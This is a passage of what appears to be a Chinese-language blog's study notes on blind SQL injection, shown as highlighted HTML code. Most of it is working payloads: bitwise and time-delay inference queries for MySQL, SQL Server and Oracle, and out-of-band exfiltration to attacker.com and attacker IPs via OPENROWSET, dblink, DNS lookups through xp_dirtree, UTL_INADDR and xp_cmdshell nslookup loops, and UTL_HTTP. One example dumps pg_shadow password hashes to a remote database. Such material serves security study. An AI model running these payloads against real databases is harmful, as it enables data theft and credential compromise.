operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token comment">-- </span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span> <span class="token keyword">THEN</span> PAUSE <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">0</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--    </span><span class="token comment">#pause()是自定义的                                          </span><span class="token comment">#无法修改内容时，强制使用除以0的条件</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token keyword">WHEN</span> <span class="token boolean">TRUE</span> <span class="token keyword">THEN</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span> <span class="token keyword">END</span><span class="token comment">#很容易将它和拆分与平衡技术结合使用：</span><span class="token string">'||(SELECT CASE(...)WHEN TRUE THEN 1/0 END)||'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SQL-Server响应技术"><a href="#SQL-Server响应技术" class="headerlink" title="SQL Server响应技术"></a>SQL Server响应技术</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">and</span> <span class="token keyword">SYSTEM_USER</span><span class="token operator">=</span><span class="token string">'sa'</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k <span class="token comment">-- </span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>J<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>J<span class="token comment">#二分法</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k <span class="token keyword">THEN</span> <span class="token string">'Bob'</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">''</span><span class="token comment">#下面是相应的使用逐位方法的例子</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'Mad'</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j <span class="token keyword">THEN</span> <span class="token string">'Bob'</span> <span class="token keyword">END</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当ASP.NET应用程序使用web.config配置文件的＜customError＞标记定义的出错页面(error page)来捕获未处理的异常时，可以添加或修改 aspxerrorpage参数，使其指向一个并不存在的页面，这样就可以旁路(bypass)出错页面。因此，如果下面的请求在功能上重定向到一个用户自定义的出错页面，请求常常会泄漏它所捕获的底层错误:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">count_reviews<span class="token punctuation">.</span>aspx?review_author<span class="token operator">=</span>MadBob'<span class="token operator">&amp;</span>aspxerrorpath<span class="token operator">=</span><span class="token operator">/</span>foo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>语法上不能存在错误，因为这会导致在执行查询之前总是失败，只 能通过某些条件来引发查询失败。可通过结合使用除数为0的子句和CASE条件来实现该目的:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k <span class="token keyword">THEN</span> CAST <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span> <span class="token keyword">AS</span> <span class="token keyword">CHAR</span><span class="token punctuation">)</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Oracle响应技术"><a href="#Oracle响应技术" class="headerlink" title="Oracle响应技术"></a>Oracle响应技术</h4><p>结构和上述数据库相似，依赖的函数不同</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> SYS_CONTEXT<span class="token punctuation">(</span><span class="token string">'USE RENV'</span><span class="token punctuation">,</span><span class="token string">'ISDBA'</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token string">'TRUE'</span>；<span class="token comment">#逐位推断，根据第二个注入谓词是否返回结果来测试状态：</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token operator">AND</span> BITAND<span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token comment">#二分搜索</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k<span class="token comment">#使用Oracle的字符串连接技术来确保在函数或过程参数列表中安全地使用,该技术使用连接和CASE语句将利用重写为拆分与平衡过的字符串</span>Mad<span class="token string">'||(SELECT CASE WHEN (ASCII(SUBSTR((...),i,1))&gt;k THEN '</span>Bob<span class="token string">' ELSE '' END FROM DUAL)||'</span><span class="token punctuation">;</span><span class="token comment">#上述代码只有在推断测试返回真时才会产生完整的MadBob字符串</span><span class="token comment">#使用除数为0子句来产生运行时错误，这与SQL Server中的操作相似</span>MadBob<span class="token string">'||(SELECT CASE WHEN BITAND((ASCII(SUBSTR((...),i,1))2^j)=2^j THEN CAST(1/0 AS CHAR) ELSE '' END FROM DUAL)||'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="返回多位信息"><a href="#返回多位信息" class="headerlink" title="返回多位信息"></a>返回多位信息</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#逐位</span><span class="token keyword">CASE</span><span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:00'</span><span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:05'</span><span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:10'</span><span class="token keyword">ELSE</span><span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:15'</span><span class="token keyword">END</span><span class="token comment">#二分</span><span class="token keyword">CASE</span><span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k<span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:05'</span><span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>k<span class="token keyword">THEN</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token keyword">ELSE</span><span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:00'</span><span class="token keyword">END</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用非主流通道"><a href="#使用非主流通道" class="headerlink" title="使用非主流通道"></a>使用非主流通道</h3><p>数据库连接、DNS、e-mail和HTTP</p><h4 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h4><p>针对mssql，攻击者可通过通道来创建从受害者数据库到攻击者数据库的连接，并通过该连接传递查询的数据。可使用OPENROWSET命令实现该目的，要想攻击成功，攻击者必须能够在受害者数据库上打开一条通向攻击者数据库的TCP(传输控制协议)连接，默认使用的是1433端口。如果受害者机器上配有出口过滤功能，或者攻击者正在执行出口过滤，那么连接就会失败。只需修改目的IP地址后面的端口号即可连接到其他端口。</p><p>示例：连接到地址为10.0.2.2的mssql用户sa并执行SQL语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;Address=10.0.2.2;uid=sa;pwd=Mypassword'</span><span class="token punctuation">,</span><span class="token string">'SELECT review_author FROM reviews'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>向外部数据库传递数据</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSOCN;Address=192.168.0.1;uid=foo;pwd=password'</span><span class="token punctuation">,</span><span class="token string">'SELECT * FROM attacker_table'</span><span class="token punctuation">)</span> <span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sysobjects <span class="token keyword">WHERE</span> xtype<span class="token operator">=</span><span class="token string">'U'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>若拥有管理员权限并启动了xp_cmdshell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#下列查询将使目标数据库发送C:\路径下的文件和目录列表：</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;Address=www.attacker.com:80; uid=sa; pwd=53kr3t'</span><span class="token punctuation">,</span><span class="token string">'SELECT * FROM table'</span><span class="token punctuation">)</span> <span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell 'dir C:\'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>oracle也支持数据库连接，但是不能镶嵌其他查询</p><p>PostgreSQL9.1或更高版本超级用户启用dblink拓展</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> EXTENSION dblink<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用dblink系列命令从攻击者数据库向由攻击者控制的PostgreSQL数据库实例复制数据。但是这些函数仅对行进行操作，而不是对结果集进行操作。如果按照这种方式，请先准备好编写依靠游标(cursor)遍历数据的PL/pgSQL函数。</p><p>例子：转储了数据库用户及其散列后的密码：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> dumper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> void <span class="token keyword">AS</span> $$<span class="token keyword">DECLARE</span>rvar record<span class="token punctuation">;</span><span class="token keyword">BEGIN</span><span class="token keyword">FOR</span> rvar <span class="token operator">in</span> <span class="token keyword">SELECT</span> usename<span class="token operator">||</span><span class="token string">','</span><span class="token operator">||</span>passwd <span class="token keyword">as</span> c <span class="token keyword">FROM</span> pg_shadow <span class="token keyword">LOOP</span>PERFORM dblink_exec<span class="token punctuation">(</span><span class="token string">'host=172.16.0.100 dbname=db user=uname password=Pass'</span><span class="token punctuation">,</span><span class="token string">'insert into dumper values('''</span><span class="token operator">||</span>rvar<span class="token punctuation">.</span>c<span class="token operator">||</span><span class="token string">''')'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span> <span class="token keyword">LOOP</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span>$$ <span class="token keyword">LANGUAGE</span> <span class="token string">'plpgsql'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="DNS渗透"><a href="#DNS渗透" class="headerlink" title="DNS渗透"></a>DNS渗透</h4><p>网络只有入口过滤而没有出口过滤时，或者仅有TCP出口过滤时，数据库可直接向攻击者发送DNS请求。</p><p>PostgreSQL、SQL server、Oracle均能直接或间接引发DNS请求，Oracle使用UTL_INADDR包，这个包包含一个明确用于查找转发条目(forward entry)的GET_HOST_ ADDRESS函数和一个用于查找逆向条目的GET_HOST_NAME函数：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">UTL_INADDR<span class="token punctuation">.</span>GET_HOST_ADDRESS<span class="token punctuation">(</span><span class="token string">'www.victim.com'</span><span class="token punctuation">)</span> <span class="token comment">-- 返回192.168.1.0</span>UTL_INADDR<span class="token punctuation">.</span>GET_HOST_NAME<span class="token punctuation">(</span><span class="token string">'192.168.1.0'</span><span class="token punctuation">)</span><span class="token comment">-- 返回www.victim.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DNS函数不需要使用PL/SQL块，可以直接插入子查询或谓词</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#插入谓词提取数据库登录用户</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span>UTL_INADDR<span class="token punctuation">.</span>GET_HOST_ADDRESS<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">USER</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'.attacker.com'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>PostgreSQL使用XML解析库的一个小技巧来初始化DNS查询</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#将一个包含数据库用户名的查找发送给DNS服务器，以查找attacker.com</span><span class="token keyword">SELECT</span> XMLPARSE<span class="token punctuation">(</span>document <span class="token string">'&lt;?xml version:"1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE x [ &lt;!ELEMENT x ANY &gt;&lt;!ENTITY xx SYSTEM "http://'</span><span class="token operator">||</span><span class="token keyword">user</span><span class="token operator">||</span>'attacker<span class="token punctuation">.</span>com<span class="token punctuation">.</span><span class="token operator">/</span>"<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>x<span class="token operator">&gt;</span><span class="token operator">&amp;</span>xx<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>x<span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>只要PostgreSQL安装了dblink,在连接字符串中就可以指定一个主机名(hostname)以引发一次DNS查找，但这要求具有超级用户的访问权限。</p><p>mssql可以通过xp_cmdshell存储过程来执行nslookup命令</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'nslookup www.victim'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果攻击者的DNS服务器是公共可用的192.168.1.1，那么直接查找DNS请求</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'nslookup www.victim 192.168.1.1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以将这些代码绑定到一些shell脚本中以提取目录内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">EXEC master<span class="token punctuation">..</span>xp_cmdshell <span class="token string">'for /F "tokens=5"%i in ('</span>'dir c:<span class="token punctuation">\</span>'<span class="token string">') do nslookup %i.attacker.com'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是数据库所在机器的默认搜索域。可以为传递给nslookup的名称添加一个点号(.)，从而阻止在默认域中进行查找。</p><p>其他储存过程,这些存储过程依赖于Windows对网络</p><p>UNC(Universal Naming Convention,通用命名约定)路径的内在支持</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xp_getfiledetails<span class="token punctuation">(</span><span class="token keyword">SQL</span> Server <span class="token number">2000</span><span class="token punctuation">,</span>需要一个文件路径<span class="token punctuation">)</span>xp_fileexist<span class="token punctuation">(</span><span class="token keyword">SQL</span> Server <span class="token number">2000</span><span class="token punctuation">,</span> <span class="token number">2005</span>、<span class="token number">2008</span> 和 <span class="token number">2008</span> R2<span class="token punctuation">,</span>需要一个文件路径<span class="token punctuation">)</span>xp_dirtree<span class="token punctuation">(</span><span class="token keyword">SQL</span> Server <span class="token number">2000.</span> <span class="token number">2005</span>、<span class="token number">2008</span> 和 <span class="token number">2008</span> R2<span class="token punctuation">,</span>需要一个文件路径<span class="token punctuation">)</span> <span class="token keyword">DECLARE</span> <span class="token variable">@a</span> <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SET</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token string">'\\'</span><span class="token operator">+</span><span class="token keyword">SYSTEM_USER</span><span class="token operator">+</span><span class="token string">'.attacker.com.'</span><span class="token punctuation">;</span> <span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token variable">@a</span><span class="token comment">#存储过程的参数列表禁止使用字符串连接，因而上述代码使用了一个中间变量来保存路径。SQL间接引发了对主机名sa.attacker.com的DNS查找，最终证明了是在使用管理员账户进行登录。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过xp_cmdshell执行DNS查找时，路径中出现非法字符会导致桩解析器 (resolver stub)失败，从而无法尝试查找。同样，UNC路径多于128个字符也会导致桩解析器失败。可以先将希望检索的数据转换成完全能够被DNS处理的格式，一种做法是将数据转换成十六进制表示。SQL Server包含一个名为FN_VARBINTOHEXSTR() 的函数，它接收类型为VARBINARY的参数并返回该数据的十六进制表示。例如：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>CAST<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span> <span class="token keyword">as</span> <span class="token keyword">VARBINARY</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- 0x73006100</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>长度问题，substring()</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@a</span> <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token string">'\\'</span><span class="token operator">+</span>master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>CAST<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">1</span> CAST<span class="token punctuation">(</span>review_body <span class="token keyword">AS</span> <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">VARBINARY</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.attacker.com.'</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token comment">-- "0x4d6f7669657320696e20746869732067656e7265206f667465.attacker.com." 或 "Movies in this genre ofte"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多行操作需要封装</p><h4 id="e-mail渗透"><a href="#e-mail渗透" class="headerlink" title="e-mail渗透"></a>e-mail渗透</h4><p>跟DNS类似，使用SMTP（Simple Mail Transfer Protocol,简单邮件传输协议）发送e-mail不需要直接连接发送者和接收者。该方法的限制在于异步性上。发送利用之后，e-mail需要过一段时间才能到达。</p><h4 id="HTTP渗透"><a href="#HTTP渗透" class="headerlink" title="HTTP渗透"></a>HTTP渗透</h4><p>适用场合是：数据库服务器拥有网络层许可来访问由攻击者控制的Web资源。SQL Server和MySQL没有包含构造HTTP请求的默认机制，使用自定义扩展实现，PostgreSQL可以使用外部语言封装成HTTP的函数，Oracle由UTL_HTTP和HTTPURITYPE包提供，public权限。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span>review_author<span class="token operator">=</span>UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'www.attacker.com/'</span><span class="token operator">||</span><span class="token keyword">USER</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>复查web日志会发现一条包含数据库登录的日志</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Oracle llg：</span><span class="token string">'a'</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'www.attacker.com/'</span><span class="token operator">||</span><span class="token 